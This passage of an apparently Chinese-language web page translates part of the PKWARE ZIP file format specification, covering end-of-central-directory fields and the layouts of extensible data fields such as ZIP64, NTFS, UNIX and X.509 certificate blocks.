如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-24、中心目录开始位置相对于压缩文档开始位置的偏移-Offset-of-start-of-central-directory-with-respect-to-the-starting-disk-number-4-bytes"><a href="#2-4-24、中心目录开始位置相对于压缩文档开始位置的偏移-Offset-of-start-of-central-directory-with-respect-to-the-starting-disk-number-4-bytes" class="headerlink" title="2.4.24、中心目录开始位置相对于压缩文档开始位置的偏移(Offset of start of central directory with respect to the starting disk number) (4 bytes)"></a>2.4.24、中心目录开始位置相对于压缩文档开始位置的偏移(Offset of start of central directory with respect to the starting disk number) (4 bytes)</h4><p>&emsp;&emsp;<code>中心目录开始位置</code>相对于<code>压缩文档开始位置</code>的偏移。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-25、-ZIP文件注释长度-ZIP-file-comment-length-2-bytes"><a href="#2-4-25、-ZIP文件注释长度-ZIP-file-comment-length-2-bytes" class="headerlink" title="2.4.25、.ZIP文件注释长度(.ZIP file comment length) (2 bytes)"></a>2.4.25、.ZIP文件注释长度(.ZIP file comment length) (2 bytes)</h4><p>&emsp;&emsp;此.ZIP文件的注释长度。</p><h4 id="2-4-26、-ZIP文件注释-ZIP-file-comment-N-bytes"><a href="#2-4-26、-ZIP文件注释-ZIP-file-comment-N-bytes" class="headerlink" title="2.4.26、.ZIP文件注释(.ZIP file comment) (N bytes)"></a>2.4.26、.ZIP文件注释(.ZIP file comment) (N bytes)</h4><p>&emsp;&emsp;此.ZIP文件的注释。ZIP文件注释数据<code>不安全</code>地存储。目前没有<code>加密</code>或<code>数据认证</code>应用于此区域。机密信息不应存储在本节中。</p><h4 id="2-4-27、ZIP64扩展数据段-ZIP64-extensible-data-sector-N-bytes"><a href="#2-4-27、ZIP64扩展数据段-ZIP64-extensible-data-sector-N-bytes" class="headerlink" title="2.4.27、ZIP64扩展数据段(ZIP64 extensible data sector) (N bytes)"></a>2.4.27、ZIP64扩展数据段(ZIP64 extensible data sector) (N bytes)</h4><p>&emsp;&emsp;目前保留供PKWARE使用。</p><h4 id="2-4-28、扩展区域-Extra-field-N-bytes"><a href="#2-4-28、扩展区域-Extra-field-N-bytes" class="headerlink" title="2.4.28、扩展区域(Extra field) (N bytes)"></a>2.4.28、扩展区域(Extra field) (N bytes)</h4><p>&emsp;&emsp;在<code>中心目录头</code>(Central directory header)中。<br>&emsp;&emsp;这应该被用于<code>存储扩展</code>。如果出于特殊<code>应用</code>或<code>平台</code>的需要，需要在ZIP文件中存储其他信息，则应将其存储在此处。然后，支持该规范较早版本的程序可以安全地跳过这个文件，并找到下一个文件或头。在<code>1.0版</code>中，该字段的长度为0。<br>&emsp;&emsp;<code>现有的扩展字段</code>在随后的“<code>可扩展数据字段</code>(Extensible data fields)”部分中定义。</p><h3 id="2-5、可扩展的数据字段-Extensible-data-fields"><a href="#2-5、可扩展的数据字段-Extensible-data-fields" class="headerlink" title="2.5、可扩展的数据字段(Extensible data fields)"></a>2.5、可扩展的数据字段(Extensible data fields)</h3><p>&emsp;&emsp;为了允许将<code>不同的程序</code>和<code>不同类型的信息</code>存储在.ZIP文件的<code>“扩展”字段</code>中，对于在此字段中存储数据的所有程序，必须使用<code>以下结构</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header1 + data1 + header2 + data2 . . .</span><br></pre></td></tr></table></figure></p><p>每个头必须包括：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header ID</td><td style="text-align:center">2</td><td style="text-align:left">头ID字段指示随后的数据块中数据的数据类型。</td></tr><tr><td style="text-align:left">Data Size</td><td style="text-align:center">2</td><td style="text-align:left">数据大小标识此数据块类型后面的数据的字节数。</td></tr></tbody></table><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><p>头ID字段指示随后的数据块中数据的数据类型。<br>头ID的0到31保留供PKWARE使用。其余的ID可以由第三方供应商用于专有用途。</p><p>PKWARE定义的当前<strong><code>头ID的映射</code></strong>为：</p><ul><li><code>0x0001</code> - Zip64 extended information extra field：ZIP64扩展信息扩展字段。</li><li><code>0x0007</code> - AV Info：AV信息。</li><li><code>0x0008</code> - Reserved for extended language encoding data (PFS)(see APPENDIX D)：保留用于扩展语言编码数据(PFS)（请参阅附录D）</li><li><code>0x0009</code> - OS/2</li><li><code>0x000A</code> - NTFS </li><li><code>0x000C</code> - OpenVMS</li><li><code>0x000D</code> - UNIX</li><li><code>0x000E</code> - Reserved for file stream and fork descriptors：保留用于文件流和派生描述符。</li><li><code>0x000F</code> - Patch Descriptor：补丁描述符。</li><li><code>0x0014</code> - PKCS#7 Store for X.509 Certificates：X.509证书的PKCS#7存储。</li><li><code>0x0015</code> - X.509 Certificate ID and Signature for individual file：X.509证书ID和单个文件的签名。</li><li><code>0x0016</code> - X.509 Certificate ID for Central Directory：中心目录的X.509证书ID。</li><li><code>0x0017</code> - Strong Encryption Header：强加密头。</li><li><code>0x0018</code> - Record Management Controls：记录管理控制。</li><li><code>0x0019</code> - PKCS#7 Encryption Recipient Certificate List：PKCS#7加密对象证书列表。</li><li><code>0x0020</code> - Reserved for Timestamp record：为Timestamp记录保留。</li><li><code>0x0021</code> - Policy Decryption Key Record：策略解密密钥记录。</li><li><code>0x0022</code> - Smartcrypt Key Provider Record：Smartcrypt密钥提供者记录。</li><li><code>0x0023</code> - Smartcrypt Policy Key Data Record：Smartcrypt策略密钥数据记录。</li><li><code>0x0065</code> - IBM S/390 (Z390), AS/400 (I400) attributes - uncompressed：IBM S/390 (Z390), AS/400 (I400)属性 - 未压缩。</li><li><code>0x0066</code> - Reserved for IBM S/390 (Z390), AS/400 (I400) attributes - compressed：为IBM S/390 (Z390), AS/400 (I400)属性保留 - 压缩。</li><li><code>0x4690</code> - POSZIP 4690 (reserved)：POSZIP 4690(保留)。</li></ul><h4 id="2-5-1、-ZIP64扩展信息扩展字段-ZIP64-Extended-Information-Extra-Field-0x0001"><a href="#2-5-1、-ZIP64扩展信息扩展字段-ZIP64-Extended-Information-Extra-Field-0x0001" class="headerlink" title="2.5.1、-ZIP64扩展信息扩展字段(ZIP64 Extended Information Extra Field)(0x0001)"></a>2.5.1、-ZIP64扩展信息扩展字段(ZIP64 Extended Information Extra Field)(0x0001)</h4><p>&emsp;&emsp;以下是<code>ZIP64扩展信息扩展块</code>的布局。如果<code>本地</code>或<code>中心目录记录</code>中的<code>大小</code>或<code>偏移量</code>字段之一太小而无法容纳所需的数据，则将创建一个<code>ZIP64扩展信息记录</code>。ZIP64扩展信息记录中<code>字段的顺序</code>是固定的，但是该字段必须仅在相应的<code>本地</code>或<code>中心目录记录</code>字段设置为<code>0xFFFF</code>或<code>0xFFFFFFFF</code>时显示。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0001</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">Size</td><td style="text-align:center">2</td><td style="text-align:left">“扩展”块的大小</td></tr><tr><td style="text-align:left">Original Size</td><td style="text-align:center">8</td><td style="text-align:left">原始未压缩文件大小</td></tr><tr><td style="text-align:left">Compressed Size</td><td style="text-align:center">8</td><td style="text-align:left">压缩数据的大小</td></tr><tr><td style="text-align:left">Relative Header Offset</td><td style="text-align:center">8</td><td style="text-align:left">本地头记录的偏移量</td></tr><tr><td style="text-align:left">Disk Start Number</td><td style="text-align:center">4</td><td style="text-align:left">该文件开始所在的磁盘号</td></tr></tbody></table><p>&emsp;&emsp;<code>本地头</code>中的此项必须包含<code>原始</code>和<code>压缩</code>文件大小字段。如果对<code>中心目录</code>进行加密并且设置了<code>通用位标志的第13位</code>以指示屏蔽，则存储在本地头中的<code>原始文件大小</code>的值将为<code>0</code>。</p><h4 id="2-5-2、-OS-2扩展字段-OS-2-Extra-Field-0x0009"><a href="#2-5-2、-OS-2扩展字段-OS-2-Extra-Field-0x0009" class="headerlink" title="2.5.2、-OS/2扩展字段(-OS/2 Extra Field)(0x0009)"></a>2.5.2、-OS/2扩展字段(-OS/2 Extra Field)(0x0009)</h4><p>以下是<code>OS/2属性“扩展”块</code>的布局。( 最新修订日期为09/05/95)</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0009</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">BSize</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的块大小</td></tr><tr><td style="text-align:left">CType</td><td style="text-align:center">2</td><td style="text-align:left">压缩类型</td></tr><tr><td style="text-align:left">EACRC</td><td style="text-align:center">4</td><td style="text-align:left">解压缩块的CRC值</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">N</td><td style="text-align:left">压缩块</td></tr></tbody></table><p>&emsp;&emsp;压缩<code>OS/2扩展属性结构</code>(FEA2LIST)，然后将其<code>完整存储</code>在此结构中。 <code>VarFields[]</code>中将永远只有一个“块”数据。</p><h4 id="2-5-3、-NTFS扩展字段-NTFS-Extra-Field-0x000A"><a href="#2-5-3、-NTFS扩展字段-NTFS-Extra-Field-0x000A" class="headerlink" title="2.5.3、-NTFS扩展字段(-NTFS Extra Field)(0x000A)"></a>2.5.3、-NTFS扩展字段(-NTFS Extra Field)(0x000A)</h4><p>&emsp;&emsp;以下是<code>NTFS属性“扩展”块</code>的布局。( <strong><code>注意：</code></strong>目前，<code>Mtime</code>，<code>Atime</code>和<code>Ctime</code>值可以在任何WIN32系统上使用。)</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000A</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">总“扩展”块的大小</td></tr><tr><td style="text-align:left">Reserved</td><td style="text-align:center">4</td><td style="text-align:left">保留以备将来使用</td></tr><tr><td style="text-align:left">Tag1</td><td style="text-align:center">2</td><td style="text-align:left">NTFS属性＃1的标签</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">Size1</td><td style="text-align:left">属性＃1数据</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">…</td></tr><tr><td style="text-align:left">TagN</td><td style="text-align:center">2</td><td style="text-align:left">NTFS属性＃N的标签</td></tr><tr><td style="text-align:left">SizeN</td><td style="text-align:center">2</td><td style="text-align:left">属性＃N的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">SizeN</td><td style="text-align:left">属性＃N数据</td></tr></tbody></table><p>对于NTFS，<code>Tag1到TagN</code>的值如下：(当前仅为NTFS定义了一组属性)</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0001</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的标签</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的大小，以字节为单位</td></tr><tr><td style="text-align:left">Mtime</td><td style="text-align:center">8</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Atime</td><td style="text-align:center">8</td><td style="text-align:left">文件最后访问时间</td></tr><tr><td style="text-align:left">Ctime</td><td style="text-align:center">8</td><td style="text-align:left">文件创建时间</td></tr></tbody></table><h4 id="2-5-4、-OpenVMS扩展字段-OpenVMS-Extra-Field-0x000C"><a href="#2-5-4、-OpenVMS扩展字段-OpenVMS-Extra-Field-0x000C" class="headerlink" title="2.5.4、-OpenVMS扩展字段(-OpenVMS Extra Field)(0x000C)"></a>2.5.4、-OpenVMS扩展字段(-OpenVMS Extra Field)(0x000C)</h4><p>以下是<code>OpenVMS属性“扩展”块</code>的布局。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000C</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">总“扩展”块的大小</td></tr><tr><td style="text-align:left">CRC</td><td style="text-align:center">4</td><td style="text-align:left">剩余块的32位CRC</td></tr><tr><td style="text-align:left">Tag1</td><td style="text-align:center">2</td><td style="text-align:left">OpenVMS属性＃1的标签</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">Size1</td><td style="text-align:left">属性＃1数据</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">…</td></tr><tr><td style="text-align:left">TagN</td><td style="text-align:center">2</td><td style="text-align:left">OpenVMS属性＃N的标签</td></tr><tr><td style="text-align:left">SizeN</td><td style="text-align:center">2</td><td style="text-align:left">属性＃N的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">SizeN</td><td style="text-align:left">属性＃N数据</td></tr></tbody></table><p><strong><code>OpenVMS扩展字段规则：</code></strong><br>&emsp;&emsp;将存在<code>一个</code>或<code>多个</code>属性，每个属性之前都带有上述<code>TagX</code>和<code>SizeX</code>值。 这些值与在OpenVMS C下的ATR.H中定义的<code>ATR$C_XXXX</code>和<code>ATR$S_XXXX</code>常数相同。这两个值都不为<code>0</code>。<br>&emsp;&emsp;不执行<code>字对齐或填充</code>。<br>&emsp;&emsp;行为良好的<code>PKZIP/OpenVMS</code>程序不应产生具有<code>相同TagX值</code>的<code>多个子块</code>。 另外，在特定的目录记录中，不得存在多个<code>0x000C</code>类型的“扩展”块。</p><h4 id="2-5-5、-UNIX扩展字段-UNIX-Extra-Field-0x000D"><a href="#2-5-5、-UNIX扩展字段-UNIX-Extra-Field-0x000D" class="headerlink" title="2.5.5、-UNIX扩展字段(-UNIX Extra Field)(0x000D)"></a>2.5.5、-UNIX扩展字段(-UNIX Extra Field)(0x000D)</h4><p>以下是<code>UNIX“扩展”块</code>的布局。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000D</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">Atime</td><td style="text-align:center">4</td><td style="text-align:left">文件最后访问时间</td></tr><tr><td style="text-align:left">Mtime</td><td style="text-align:center">4</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Uid</td><td style="text-align:center">2</td><td style="text-align:left">文件用户ID</td></tr><tr><td style="text-align:left">Gid</td><td style="text-align:center">2</td><td style="text-align:left">文件组ID</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">N</td><td style="text-align:left">可变长度数据字段</td></tr></tbody></table><p>&emsp;&emsp;<code>可变长度数据字段</code>将包含特定于文件类型的数据。当前，唯一允许的值为硬链接或符号链接“链接到”的<code>原始文件名</code>，以及<code>字符</code>和块设备节点的<code>主要和次要设备节点号</code>。由于<code>设备节点</code>不能是符号链接或硬链接，因此仅存储一组可变长度数据。<code>链接文件</code>将具有存储的原始文件的名称。此名称不是以<code>NULL</code>终止的。可以通过检查<code>TSize -12</code>来确定其大小。<code>设备条目</code>将有<code>8个字节</code>存储为两个<code>4字节条目</code>(采用<code>小端序</code>格式)。第一个条目将是<code>主设备号</code>，第二个条目是<code>次设备号</code>。</p><h4 id="2-5-6、-PATCH描述符扩展字段-PATCH-Descriptor-Extra-Field-0x000F"><a href="#2-5-6、-PATCH描述符扩展字段-PATCH-Descriptor-Extra-Field-0x000F" class="headerlink" title="2.5.6、-PATCH描述符扩展字段(-PATCH Descriptor Extra Field)(0x000F)"></a>2.5.6、-PATCH描述符扩展字段(-PATCH Descriptor Extra Field)(0x000F)</h4><p>以下是<code>PATCH描述符“扩展”块</code>的布局。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000F</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">总“扩展”块的大小</td></tr><tr><td style="text-align:left">Version</td><td style="text-align:center">2</td><td style="text-align:left">描述符的版本</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">4</td><td style="text-align:left">Actions和reactions（见下文）</td></tr><tr><td style="text-align:left">OldSize</td><td style="text-align:center">4</td><td style="text-align:left">被打补丁的文件大小</td></tr><tr><td style="text-align:left">OldCRC</td><td style="text-align:center">4</td><td style="text-align:left">被打补丁的文件CRC32</td></tr><tr><td style="text-align:left">NewSize</td><td style="text-align:center">4</td><td style="text-align:left">结果文件的大小</td></tr><tr><td style="text-align:left">NewCRC</td><td style="text-align:center">4</td><td style="text-align:left">结果文件的CRC32</td></tr></tbody></table><p><strong><code>Actions和reactions：</code></strong></p><table><thead><tr><th style="text-align:left">Bits</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">用于自动检测</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">视为自修补程序</td></tr><tr><td style="text-align:left">2-3</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">4-5</td><td style="text-align:left">Actions（见下文）</td></tr><tr><td style="text-align:left">6-7</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">8-9</td><td style="text-align:left">对缺少文件的reactions（见下文）</td></tr><tr><td style="text-align:left">10-11</td><td style="text-align:left">对较新文件的reactions（见下文）</td></tr><tr><td style="text-align:left">12-13</td><td style="text-align:left">对位置文件的reactions（见下文）</td></tr><tr><td style="text-align:left">14-15</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:left">16-31</td><td style="text-align:left">保留</td></tr></tbody></table><p><strong><code>Actions：</code></strong>            </p><table><thead><tr><th style="text-align:left">Action</th><th style="text-align:left">Value</th></tr></thead><tbody><tr><td style="text-align:left">none</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">add</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">delete</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">patch</td><td style="text-align:left">3</td></tr></tbody></table><p><strong><code>reactions：</code></strong></p><table><thead><tr><th style="text-align:left">Action</th><th style="text-align:left">Value</th></tr></thead><tbody><tr><td style="text-align:left">ask</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">skip</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">ignore</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">fail</td><td style="text-align:left">3</td></tr></tbody></table><p>&emsp;&emsp;<code>补丁程序</code>支持是由PKPatchMaker(tm)技术提供的，并受美国<code>专利和正在审理的专利</code>保护。在产品中<code>使用</code>或<code>实现</code>当前附录中规定的某些技术方面(包括与<code>强加密</code>或<code>补丁</code>相关的方面)需要获得PKWARE的许可。</p><h4 id="2-5-7、-X-509证书的PKCS-7存储-PKCS-7-Store-for-X-509-Certificates-0x0014"><a href="#2-5-7、-X-509证书的PKCS-7存储-PKCS-7-Store-for-X-509-Certificates-0x0014" class="headerlink" title="2.5.7、-X.509证书的PKCS#7存储(-PKCS#7 Store for X.509 Certificates)(0x0014)"></a>2.5.7、-X.509证书的PKCS#7存储(-PKCS#7 Store for X.509 Certificates)(0x0014)</h4><p>&emsp;&emsp;该字段必须包含有关可以<code>用来签名的每个证书文件</code>的信息。当为ZIP文件启用<code>中心目录加密功能</code>时，该记录将出现在“<code>压缩文档扩展数据记录</code>(Archive extra data record)”中，否则将出现在<code>第一个中心目录记录</code>中，而在<code>任何其他记录</code>中将<code>被忽略</code>。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0014</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">存储的数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">存储的数据</td></tr></tbody></table><h4 id="2-5-8、-X-509证书ID和单个文件的签名-X-509-Certificate-ID-and-Signature-for-individual-file-0x0015"><a href="#2-5-8、-X-509证书ID和单个文件的签名-X-509-Certificate-ID-and-Signature-for-individual-file-0x0015" class="headerlink" title="2.5.8、-X.509证书ID和单个文件的签名(-X.509 Certificate ID and Signature for individual file)(0x0015)"></a>2.5.8、-X.509证书ID和单个文件的签名(-X.509 Certificate ID and Signature for individual file)(0x0015)</h4><p>&emsp;&emsp;此字段包含有关使用<code>PKCS#7存储</code>中的哪个证书对<code>特定文件</code>进行签名的信息。它还包含<code>签名数据</code>。该字段可以出现<code>多次</code>，但<code>每个证书</code>只能出现一次。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0015</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">后续数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">签名数据</td></tr></tbody></table><h4 id="2-5-9、-X-509证书ID和中心目录签名-X-509-Certificate-ID-and-Signature-for-central-directory-0x0016"><a href="#2-5-9、-X-509证书ID和中心目录签名-X-509-Certificate-ID-and-Signature-for-central-directory-0x0016" class="headerlink" title="2.5.9、-X.509证书ID和中心目录签名(-X.509 Certificate ID and Signature for central directory)(0x0016)"></a>2.5.9、-X.509证书ID和中心目录签名(-X.509 Certificate ID and Signature for central directory)(0x0016)</h4><p>&emsp;&emsp;此字段包含有关使用<code>PKCS#7存储</code>中的哪个证书来签名<code>中心目录结构</code>的信息。当为ZIP文件启用<code>中心目录加密功能</code>时，该记录将显示在“<code>压缩文档扩展数据记录</code>(Archive extra data record)”中，否则将出现在<code>第一个中心目录记录</code>中。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0016</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">后续数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">数据</td></tr></tbody></table><h4 id="2-5-10、-强加密头-Strong-Encryption-Header-0x0017"><a href="#2-5-10、-强加密头-Strong-Encryption-Header-0x0017" class="headerlink" title="2.5.10、-强加密头(-Strong Encryption Header)(0x0017)"></a>2.5.10、-强加密头(-Strong Encryption Header)(0x0017)</h4><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0017</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">后续数据的大小</td></tr><tr><td style="text-align:left">Format</td><td style="text-align:center">2</td><td style="text-align:left">该记录的格式定义</td></tr><tr><td style="text-align:left">AlgID</td><td style="text-align:center">2</td><td style="text-align:left">加密算法标识符</td></tr><tr><td style="text-align:left">Bitlen</td><td style="text-align:center">2</td><td style="text-align:left">加密密钥的位长</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">2</td><td style="text-align:left">处理标志</td></tr><tr><td style="text-align:left">CertData</td><td style="text-align:center">TSize-8</td><td style="text-align:left">证书解密扩展字段数据（请参阅“强加密规范”下描述证书处理方法的部分中对CertData的解释）</td></tr></tbody></table><p>有关详细信息，请参见描述<code>强加密规范</code>的部分。 </p><h4 id="2-5-11、-记录管理控制-Record-Management-Controls-0x0018"><a href="#2-5-11、-记录管理控制-Record-Management-Controls-0x0018" class="headerlink" title="2.5.11、-记录管理控制(-Record Management Controls)(0x0018)"></a>2.5.11、-记录管理控制(-Record Management Controls)(0x0018)</h4><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0018</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">CSize</td><td style="text-align:center">2</td><td style="text-align:left">总扩展数据块的大小</td></tr><tr><td style="text-align:left">Tag1</td><td style="text-align:center">2</td><td style="text-align:left">记录控制属性1</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性1的大小，以字节为单位</td></tr><tr><td style="text-align:left">Data1</td><td style="text-align:center">Size1</td><td style="text-align:left">属性1数据</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">…</td></tr><tr><td style="text-align:left">TagN</td><td style="text-align:center">2</td><td style="text-align:left">记录控制属性N</td></tr><tr><td style="text-align:left">SizeN</td><td style="text-align:center">2</td><td style="text-align:left">属性N的大小，以字节为单位</td></tr><tr><td style="text-align:left">DataN</td><td style="text-align:center">SizeN</td><td style="text-align:left">属性N数据</td></tr></tbody></table><h4 id="2-5-12、-PKCS＃7加密接受者证书列表-PKCS-7-Encryption-Recipient-Certificate-List-0x0019"><a href="#2-5-12、-PKCS＃7加密接受者证书列表-PKCS-7-Encryption-Recipient-Certificate-List-0x0019" class="headerlink" title="2.5.12、-PKCS＃7加密接受者证书列表(-PKCS#7 Encryption Recipient Certificate List)(0x0019)"></a>2.5.12、-PKCS＃7加密接受者证书列表(-PKCS#7 Encryption Recipient Certificate List)(0x0019)</h4><p>&emsp;&emsp;该字段可以包含有关<code>加密处理</code>中使用的每个证书的信息，并且可以用来识别<code>允许谁解密加密文件</code>。 该字段仅应出现在“<code>压缩文档扩展数据记录</code>(Archive extra data record)”中。 该字段<code>不是必填字段</code>，仅用于通过<code>保留公共加密密钥数据</code>来帮助<code>压缩文档修改</code>。 个别安全要求可能会要求<code>省略</code>此数据以<code>阻止信息泄露</code>。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0019</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">存储的数据的大小</td></tr><tr><td style="text-align:left">TData</td><td style="text-align:center">TSize</td><td style="text-align:left">存储的数据</td></tr></tbody></table><p><code>TData:</code></p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">Version</td><td style="text-align:center">2</td><td style="text-align:left">格式版本号-此时必须为0x0001</td></tr><tr><td style="text-align:left">CStore</td><td style="text-align:center">(var)</td><td style="text-align:left">PKCS＃7数据Blob</td></tr></tbody></table><p>&emsp;&emsp;有关详细信息，请参见描述<code>强加密规范</code>的部分。 </p><h4 id="2-5-13、-MVS扩展字段-MVS-Extra-Field-0x0065"><a href="#2-5-13、-MVS扩展字段-MVS-Extra-Field-0x0065" class="headerlink" title="2.5.13、-MVS扩展字段(-MVS Extra Field)(0x0065)"></a>2.5.13、-MVS扩展字段(-MVS Extra Field)(0x0065)</h4><p>以下是<code>MVS扩展字段</code>的布局。<br><strong><code>注意:</code></strong>某些字段以<code>大端格式</code>存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th 